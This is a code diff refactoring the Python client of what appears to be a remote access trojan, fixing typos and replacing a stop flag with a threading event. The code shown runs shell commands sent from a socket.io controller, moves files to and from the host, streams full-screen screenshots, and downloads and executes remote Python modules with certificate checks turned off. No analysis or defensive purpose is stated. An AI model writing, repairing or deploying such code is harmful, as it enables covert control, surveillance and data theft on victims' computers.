@@ -12,12 +12,13 @@ import mss
 import time
 import io
 
+# Declare the global stop event
+stop_event = threading.Event()
+
 def run(data):
-    stop_thread = False
-    def create_moduel(url):
+    def create_module(url):
         # Create an SSL context that doesn't verify certificates
         context = ssl._create_unverified_context()
-        # Use the context when opening the URL
         with urlopen(url, context=context) as response:
             code = response.read().decode('utf-8')
     
@@ -43,7 +44,6 @@ def run(data):
         shellScript = "bash"
 
     class InteractiveShell:
-
         def __init__(self):
             self.process = None
             self.running = False
@@ -75,7 +75,6 @@ def run(data):
                 if output:
                     sio.emit("result", output)
 
-    # Define event handlers outside the class
     @sio.on("command")
     def command(data_new):
         if data['uuid'] == data_new['id']:
@@ -98,7 +97,6 @@ def run(data):
         print(sio.sid)
         print(data["uuid"])
 
-    
     @sio.on('upload_file')
     def upload_file(data_new):
         if data['uuid'] == data_new['uuid']:
@@ -106,7 +104,6 @@ def run(data):
             with open(data_new['file_name'], 'wb') as f:
                 decoded_data = base64.b64decode(data_new['file'])
                 f.write(decoded_data)
-
 
     @sio.on("download_file")
     def download_file(data_new):
@@ -117,23 +114,21 @@ def run(data):
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
             print("emited")
 
-
     @sio.on("pem")
     def pem(data_new):
         if data['uuid'] == data_new['uuid']:
-            print(data['url']+data_new['url'])
-            moduel = create_moduel(data['url']+data_new['url'])
-            moduel.run(sio, data['uuid'])
+            print(data['url'] + data_new['url'])
+            module = create_module(data['url'] + data_new['url'])
+            module.run(sio, data['uuid'])
 
     def take_screenshots(sio, uid, fps=5, quality=20):
-        global stop_thread
         frame_interval = 1 / fps
         last_capture_time = 0
 
         with mss.mss() as sct:
             monitor = sct.monitors[0]  # Capture the entire screen
 
-            while not stop_thread:
+            while not stop_event.is_set():
                 current_time = time.time()
                 if current_time - last_capture_time >= frame_interval:
                     # Capture screenshot
@@ -156,18 +151,17 @@ def run(data):
                 # Small sleep to prevent a tight loop
                 time.sleep(0.001)
 
-
     screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
+
     @sio.on("screen_status")
     def screen_status(data_new):
         if data['uuid'] == data_new['uid']:
             if data_new['status'] == "start":
-                stop_thread = False
+                stop_event.clear()  # Reset the event to False
                 screenshot_thread.start()
             else:
-                stop_thread = True
-                screenshot_thread.join()
-
+                stop_event.set()  # Signal the thread to stop
+                screenshot_thread.join()  # Wait for the thread to finish
 
     sio.connect(data['url'])
 
